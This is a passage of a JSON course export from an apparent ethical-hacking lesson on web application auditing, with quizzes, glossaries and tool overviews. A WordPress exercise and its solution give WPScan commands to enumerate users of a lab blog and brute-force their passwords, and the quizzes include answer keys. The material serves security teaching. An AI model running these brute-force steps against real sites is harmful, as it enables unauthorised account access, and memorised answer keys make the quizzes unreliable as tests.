+                "china_cdn_id": "JVeSB0aGnRs.mp4"
+              }
+            },
+            {
+              "id": 1123162,
+              "key": "3ea37db3-7a31-4e71-b1a6-84e0de6cb11a",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "Nikto is a fully automated tool to test web server security.\n\n* To install Nikto, run:\n```bash\napt-get install nikto -y\n```\n* To use Nikto, use the command: \n```\nnikto -host <IP address>\n```\n* Nikto also has a detailed help menu that can be accessed from:\n```bash\nnikto --help\n```",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1127811,
+              "key": "4a1aeb08-c1bb-4b4e-a630-d52c92ed5fe1",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### New Terms\n\n<div class=\"index-module--table-responsive--1zG6k\"><table class=\"index-module--table--8j68C index-module--table-striped--3HHC-\">\n<thead>\n<tr>\n<th>Term</th>\n<th>Definition</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Command Injection</td>\n<td>An attack where malicious commands are directly executed on the system hosting the application</td>\n</tr>\n<tr>\n<td>Commix</td>\n<td>A fully automated tool used to test an application against command injection vulnerabilities</td>\n</tr>\n<tr>\n<td>Cross-Site Scripting (XSS)</td>\n<td>An attack where scripts (typically written in javascript) are executed in the user's browser when an infected element is loaded</td>\n</tr>\n<tr>\n<td>Nikto</td>\n<td>A fully automated tool used to audit the web server security</td>\n</tr>\n<tr>\n<td>SQL Injection</td>\n<td>An attack where malicious SQL queries are inserted into an input field and executed by the database management system</td>\n</tr>\n<tr>\n<td>SQLmap</td>\n<td>A fully automated tool used to test an application against SQL injection vulnerabilities</td>\n</tr>\n<tr>\n<td>XSS Strike</td>\n<td>A fully automated tool used to test an application against cross-site scripting vulnerabilities</td>\n</tr>\n</tbody>\n</table>\n</div>",
+              "instructor_notes": null
+            },
+            {
+              "id": 1123110,
+              "key": "bf191b73-341b-4ff4-b6db-a414e69a2f3e",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Further Reading\n\nSemi-automated and fully automated tools should only be used to increase your testing efficiency. Learn more about when to use them and when not to use them by reading these slides from the OWASP-NL Chapter Meeting 2014-04-24:    <a href=\"https://owasp.org/www-pdf-archive//OWASP-NL_Chapter_Meeting_2014-04_-24_dont_be_a_tools_fool.pdf\" target=\"_blank\">Don't be a tools fool</a>.",
+              "instructor_notes": null
+            }
+          ]
+        },
+        {
+          "id": 1123165,
+          "key": "c8377df9-c32c-49b5-9033-92c50eeba304",
+          "title": "Quizzes: Fully Automated Tools",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "c8377df9-c32c-49b5-9033-92c50eeba304",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1124076,
+              "key": "8e8ec791-8e01-489e-8989-1ed5c5825eb2",
+              "title": null,
+              "semantic_type": "CheckboxQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "8e8ec791-8e01-489e-8989-1ed5c5825eb2",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "Fully-Automated tools can be used to",
+                "answers": [
+                  {
+                    "id": "b4074e1b-3c73-4fb8-bdec-9c11784085b0",
+                    "text": "Test XSS vulnerability",
+                    "is_correct": true
+                  },
+                  {
+                    "id": "db5f8a75-0aa5-4913-b582-13e7fbf603e8",
+                    "text": "Test Apache webserver",
+                    "is_correct": true
+                  },
+                  {
+                    "id": "87b5000b-152a-4ecd-8cc8-ac5d72620b91",
+                    "text": "Calculate CVSS",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "caa48374-39d3-4164-bcd0-c593eb718f7b",
+                    "text": "Exploit file upload vulnerability",
+                    "is_correct": true
+                  }
+                ]
+              }
+            },
+            {
+              "id": 1124075,
+              "key": "a34b68b5-af17-46c9-92ec-49ab9dacf961",
+              "title": null,
+              "semantic_type": "RadioQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "a34b68b5-af17-46c9-92ec-49ab9dacf961",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "Can semi-automated tools substitute fully automated tools if efficiency is not a concern?",
+                "answers": [
+                  {
+                    "id": "1235f4b8-a010-4bce-b069-694866d564fb",
+                    "text": "Yes",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "ca1eac82-d31b-438b-878c-5bb71e07c825",
+                    "text": " No",
+                    "is_correct": true
+                  }
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "id": 1123164,
+          "key": "c773313f-3a9d-4daf-8fe8-556001fc5c90",
+          "title": "Exercise: Test a WordPress Blog",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "c773313f-3a9d-4daf-8fe8-556001fc5c90",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1124088,
+              "key": "e5e641fd-b6a2-451e-a165-707337734d87",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "In this exercise, your task is to audit a WordPress blog located at `sbva.local/blog`\n\nTo do this you'll use WPScan which is a WordPress security scanner.  ",
+              "instructor_notes": null
+            },
+            {
+              "id": 1124089,
+              "key": "6d2d8e16-e472-4698-a1f8-3dd084ea0dc5",
+              "title": "Excercise: Test a WordPress Blog",
+              "semantic_type": "TaskListAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "6d2d8e16-e472-4698-a1f8-3dd084ea0dc5",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "tasks": [
+                "Run `wpscan -h` to read the scanner's help menu ",
+                "Find the blog's WordPress version",
+                "Find all of the installed themes and plugins",
+                "Check for known WordPress vulnerabilities",
+                "Find valid usernames",
+                "Bruteforce using common passwords"
+              ],
+              "positive_feedback": null,
+              "video_feedback": null,
+              "description": "To complete this exercise you'll need to install  WPScan on your analyst machine:\n```\n apt-get install wpscan\n```"
+            }
+          ]
+        },
+        {
+          "id": 1122418,
+          "key": "5269a2c2-0975-4f1b-ac5d-bba80eb0e04e",
+          "title": "Solution: Test a WordPress Blog",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "5269a2c2-0975-4f1b-ac5d-bba80eb0e04e",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1124166,
+              "key": "9ce5d68e-a228-4e30-bdd3-4e41fc4f7169",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## My Solution",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1122419,
+              "key": "e41a2589-256c-4b33-b744-5aa20f8b1738",
+              "title": "ND350 EHND C1 L3 A12a Scanning With WPScan V2",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "video": {
+                "youtube_id": "CZeKQaLD0yE",
+                "china_cdn_id": "CZeKQaLD0yE.mp4"
+              }
+            },
+            {
+              "id": 1129535,
+              "key": "93eaac51-de52-41ac-b192-950d9113c71d",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Information Gathering Using WPScan\n\n1. Install the wpscan tool by running: \n1. Use `-h` to display the tool's help menu`wpscan -h`\n1. Enumerate all plugins,  themes, and users from the target by running:\n\n```\nwpscan -e vt,vp,u --url http://sbva.local/blog >a\n```",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1129814,
+              "key": "ad3dac3c-d86a-4964-abf7-5baa50cc6f4e",
+              "title": "ND350 EHND C1 L3 A12b Testing SQL Injection Using SQLMap",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "video": {
+                "youtube_id": "e7TmxtVH_wM",
+                "china_cdn_id": "e7TmxtVH_wM.mp4"
+              }
+            },
+            {
+              "id": 1129815,
+              "key": "57663519-4cf8-43b9-b047-a6bfa8f8ab8c",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Bruteforcing Users' Passwords Using WPScan\n\n1. Save the identified usernames in a text file: `users`\n1. Search the internet for common passwords and save them in another text file: `pas`\n1. Perform a brute-force attack with the username and password lists you created: \n\n```\nwpscan -U users -P pass --url http://sbva.local/blog >b\n```",
+              "instructor_notes": null
+            }
+          ]
+        },
+        {
+          "id": 1089732,
+          "key": "9a837eaf-2144-4db1-a684-d4ccf1dd4e5e",
+          "title": "So Many Things To Hack",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "9a837eaf-2144-4db1-a684-d4ccf1dd4e5e",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1124078,
+              "key": "98ac9570-109f-4fbb-a17d-900f135d78ad",
+              "title": null,
+              "semantic_type": "RadioQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "98ac9570-109f-4fbb-a17d-900f135d78ad",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "Which of these statements is incorrect?",
+                "answers": [
+                  {
+                    "id": "90043042-7c5d-4c7d-9885-b46a14b06b89",
+                    "text": "Twitter on your phone is an example of application",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "9f49c385-5a9c-47b2-95a2-2fa1b762c9b4",
+                    "text": "Google Drive is an example of application",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "d25a9eb2-7a5c-4f58-a995-a4d1c7cb1551",
+                    "text": "Notepad is an example of application",
+                    "is_correct": true
+                  }
+                ]
+              }
+            },
+            {
+              "id": 1089725,
+              "key": "4140a37a-c2a5-4d47-9d5b-d7ce02a5528f",
+              "title": "No Vulnerability? Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## How Do We Keep Up?",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089727,
+              "key": "18199f2f-db94-495a-8a3d-d2751e552954",
+              "title": "ND350 EHND C1 L3 A13 So Many Things To Hack V3",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "jGmbYCW0E3w",
+                "china_cdn_id": "jGmbYCW0E3w.mp4"
+              }
+            },
+            {
+              "id": 1129397,
+              "key": "a02d14ff-6a45-406c-9db4-2201a954dcc3",
+              "title": "No Vulnerability? Text",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Ethical Hacking Can Be Done on Any Device That Is Connected To a Network\n\nWe can keep up with all of the test methods through:\n\n* **Continuous Learning** - About half of our time is spent learning about the changes in the industry.\n* **Following established methodologies** -  Although each methodology is different, they all follow similar patterns to the ones you've learned in the course.\n\n### Popular Methodologies\n\n* <a href=\"\" target=\"_blank\"> </a><a href=\"https://github.com/OWASP/owasp-mstg/releases\" target=\"_blank\">OWASP Mobile Security Testing Guide (OWASP MSTG)</a>: a methodology for mobile testing. It includes\n   * A general framework for testing mobile apps\n   * Specific instructions for Android app testing\n   * Specific instructions for IOS app testing \n* <a href=\"https://cloudsecurityalliance.org/artifacts/cloud-penetration-testing-playbook/\" target=\"_blank\">Cloud Security Alliance (CSA) Cloud Penetration Testing Playbook from CSA</a>: a methodology to test cloud infrastructure. It follows five phases of testing:  Preparation, Threat Modeling, Reconnaissance and Research, Testing, and Reporting.\n* <a href=\"https://ieeexplore.ieee.org/document/8597192\" target=\"_blank\">IEEE Security Testing Methodology of IoT</a>: a methodology for testing IoT devices published the Institute of Electrical and Electronics Engineers. This methodology is not open-source and must be purchased. \n\n### General Security Testing Methodologies\n\n* <a href=\"https://www.isecom.org/OSSTMM.3.pdf\" target=\"_blank\">OSSTM</a>:  Open Source Security Testing Methodology Manual\n* <a href=\"http://www.pentest-standard.org/index.php/Main_Page\" target=\"_blank\">PTES</a>: penetration testing execution standard\n* <a href=\"https://untrustednetwork.net/files/issaf0.2.1.pdf\" target=\"_blank\">ISSAF</a>:  Information System Security Assessment Framework\n* Publications from NIST including <a href=\"https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final\" target=\"_blank\">SP 800-53</a> -Security and Privacy Controls for Federal Information Systems and Organizations",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1124080,
+              "key": "0d7a5617-3268-4f9d-9b82-353b45e8a876",
+              "title": null,
+              "semantic_type": "CheckboxQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "0d7a5617-3268-4f9d-9b82-353b45e8a876",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "Methodologies are important because (Select two)",
+                "answers": [
+                  {
+                    "id": "28d14578-77cd-4394-9587-5dd0bd63d949",
+                    "text": "Methodologies provides legally defensible reports",
+                    "is_correct": true
+                  },
+                  {
+                    "id": "14642425-b9e0-48f1-bf27-a835713e31a3",
+                    "text": "Methodologies increases confidence in the report",
+                    "is_correct": true
+                  },
+                  {
+                    "id": "5e8505d1-f79f-46e2-9dcf-c61b05a3ed2e",
+                    "text": "Methodologies ensures that our systems will never get hacked",
+                    "is_correct": false
+                  }
+                ]
+              }
+            },
+            {
+              "id": 1127816,
+              "key": "ddde413b-2e75-4ce9-a2f4-2f22aa076a3f",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### New Terms\n\n<div class=\"index-module--table-responsive--1zG6k\"><table class=\"index-module--table--8j68C index-module--table-striped--3HHC-\">\n<thead>\n<tr>\n<th>Term</th>\n<th>Definition</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Cloud Security Alliance (CSA)</td>\n<td>A non-profit organization and the publisher of Cloud Penetration Testing Playbook, which is a methodology for cloud security assessments.</td>\n</tr>\n<tr>\n<td>Institute of Electrical and Electronics Engineers (IEEE)</td>\n<td>A professional association known for its publications and technology standards</td>\n</tr>\n<tr>\n<td>National Institute of Standards and Technology (NIST)</td>\n<td>A non-regulatory agency of the US Department of Commerce that publishes many publications and standards used by all Federal departments and their contractors for their information security programs. NIST standards are followed by many other organizations outside of the US as well.</td>\n</tr>\n<tr>\n<td>OWASP Mobile Security Testing Guide (MSTG)</td>\n<td>A methodology designed to test mobile applications.</td>\n</tr>\n</tbody>\n</table>\n</div>",
+              "instructor_notes": null
+            }
+          ]
+        },
+        {
+          "id": 1089747,
+          "key": "26e1a011-f5ad-439f-a412-143dc38db2ee",
+          "title": "Lesson Recap",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "26e1a011-f5ad-439f-a412-143dc38db2ee",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089742,
+              "key": "5f6e5fa2-f4cb-4d0a-b26b-8fae6d2553ae",
+              "title": "Lesson Recap Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## What We Have Learned",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089743,
+              "key": "70e862dd-12be-4c66-93de-8d2741552680",
+              "title": "ND350 EHND C1 L3 A14 Lesson Recap V3",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "BPrGHc5nMZs",
+                "china_cdn_id": "BPrGHc5nMZs.mp4"
+              }
+            },
+            {
+              "id": 1089744,
+              "key": "57a3da70-f85a-4e69-9444-6dec0778c797",
+              "title": "Lesson Recap Summary",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "In this lesson, we learned about web application auditing and focused on five topics:\n\n### OWASP WSTG\n\nWe learned about the OWASP Web Security Testing Guide and explored all 11 categories of web application tests. We also learned how to use the guide to perform specific tests.\n\n### Request and Response\n\n We looked at HTTP Request methods like `GET`, `PUT`, `POST`, `DELETE`, `HEAD`and `OPTIONS`.  We also explored response codes and learned how to use `curl` to send requests. \n\n### Semi-Automated Tools\n\nWe discovered how using semi-automated tools can reduce the workload and increase the efficiency of the testing process. We used a tool called Burp Suite to perform a brute force attack on a website’s login page.\n\n### Fully Automated Tools\n\nWe also learned why a semi-automated tool may not be enough and how to use fully automated tools to perform specific tests related to vulnerabilities,  functions, and products.\n\n### So Many Things To Hack!\n\nWe ended this lesson with a discussion about other things that can be hacked. We learned that each type of device requires a different methodology, which is why continuous learning is so important in this industry.",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1133384,
+              "key": "ded2f9c2-ee90-4d5d-9da3-f8b59f9354e3",
+              "title": null,
+              "semantic_type": "ImageAtom",
+              "is_public": true,
+              "url": "https://video.udacity-data.com/topher/2021/February/602147e6_l4-social-engineering/l4-social-engineering.jpg",
+              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/ded2f9c2-ee90-4d5d-9da3-f8b59f9354e3",
+              "caption": "Up Next: Social Engineering",
+              "alt": "Up Next: Social Engineering",
+              "width": 882,
+              "height": 172,
+              "instructor_notes": null
+            },
+            {
+              "id": 1122102,
+              "key": "39d89e2b-d696-4b42-a5cc-fde7c8a43119",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## In The Next Lesson, We Will Focus On:\n\n* Five Opportunities In Human Psychology\n* Phishing Simulations\n* Creating Malware\n* Landing Page For SE\n* Ethics of SE",
+              "instructor_notes": null
+            }
+          ]
+        },
+        {
+          "id": 1089750,
+          "key": "10de2e1f-cb4c-4971-b8f1-efa93b2986ff",
+          "title": "Glossary",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "10de2e1f-cb4c-4971-b8f1-efa93b2986ff",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089748,
+              "key": "63e88708-bf90-431a-82b1-9be95d0abe02",
+              "title": "Glossary Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## New Terms In This Lesson",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1127825,
+              "key": "f8819e1c-88e9-4180-b6dc-b00230db9ca9",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "<div class=\"index-module--table-responsive--1zG6k\"><table class=\"index-module--table--8j68C index-module--table-striped--3HHC-\">\n<thead>\n<tr>\n<th>Term</th>\n<th>Definition</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Burp Suite</td>\n<td>A suite of application security testing tools developed by Portswigger.</td>\n</tr>\n<tr>\n<td>Cloud Security Alliance (CSA)</td>\n<td>A non-profit organization and the publisher of Cloud Penetration Testing Playbook, which is a methodology for cloud security assessments.</td>\n</tr>\n<tr>\n<td>Command Injection</td>\n<td>An attack where malicious commands are directly executed on the system hosting the application</td>\n</tr>\n<tr>\n<td>Commix</td>\n<td>A fully automated tool used to test an application against command injection vulnerabilities</td>\n</tr>\n<tr>\n<td>Cross-Site Scripting (XSS)</td>\n<td>An attack where scripts (typically written in javascript) are executed in the user's browser when an infected element is loaded</td>\n</tr>\n<tr>\n<td>Dictionary Brute Force Attack</td>\n<td>A password cracking attack that tries every combination of usernames and passwords from a list.</td>\n</tr>\n<tr>\n<td>HTTP Request</td>\n<td>A request sent by the client to the server to perform actions on a specific resource URL. The action to be performed is defined by an HTTP Method.</td>\n</tr>\n<tr>\n<td>HTTP Response</td>\n<td>The reply from the server back to the client about the previously made request.</td>\n</tr>\n<tr>\n<td>Hypertext Transfer Protocol (HTTP)</td>\n<td>An application layer protocol used to exchange data over the internet</td>\n</tr>\n<tr>\n<td>Institute of Electrical and Electronics Engineers (IEEE)</td>\n<td>A professional association known for its publications and technology standards</td>\n</tr>\n<tr>\n<td>Intruder Tab</td>\n<td>A Burp Suite tab used to automate sending a request with multiple minor changes</td>\n</tr>\n<tr>\n<td>National Institute of Standards and Technology (NIST)</td>\n<td>A non-regulatory agency of the US Department of Commerce that publishes many publications and standards used by all Federal departments and their contractors for their information security programs. NIST standards are followed by many other organizations outside of the US as well.</td>\n</tr>\n<tr>\n<td>Nikto</td>\n<td>A fully automated tool used to audit the web server security</td>\n</tr>\n<tr>\n<td>OWASP Mobile Security Testing Guide (MSTG)</td>\n<td>A methodology designed to test mobile applications.</td>\n</tr>\n<tr>\n<td>Proxy</td>\n<td>A system placed in the middle of an active communication between a  client and server. When a client sends a request to the server, it is routed through the proxy before reaching the server. Similarly, when the server returns a response, it routes through the proxy before reaching the client.</td>\n</tr>\n<tr>\n<td>Proxy Tab</td>\n<td>A Burp Suite tab used to intercept a request and modify, forward, or drop it. It can also be used to check previously sent requests and responses.</td>\n</tr>\n<tr>\n<td>Semi-Automated Tools</td>\n<td>Proxy-based tools that intercept a request from the analyst's browser and modify, forward, or drop it. These tools can automate sending and analyzing thousands of requests to increase testing efficiency</td>\n</tr>\n<tr>\n<td>SQL Injection</td>\n<td>An attack where malicious SQL queries are inserted into an input field and executed by the database management system</td>\n</tr>\n<tr>\n<td>SQLmap</td>\n<td>A fully automated tool used to test an application against SQL injection vulnerabilities</td>\n</tr>\n<tr>\n<td>XSS Strike</td>\n<td>A fully automated tool used to test an application against cross-site scripting vulnerabilities</td>\n</tr>\n</tbody>\n</table>\n</div>",
+              "instructor_notes": null
+            }
+          ]
+        }
+      ]
+    }
+  },
+  "_deprecated": [
+    {
+      "name": "lesson_type",
+      "reason": "Obsolete"
+    },
+    {
+      "name": "non_google_url",
+      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
+    },
+    {
+      "name": "non_google_url",
+      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
+    },
+    {
+      "name": "non_google_url",
+      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
+    },
+    {
+      "name": "non_google_url",
+      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
+    },
+    {
+      "name": "non_google_url",
+      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
+    },
+    {
+      "name": "non_google_url",
+      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
+    }
+  ]
+}
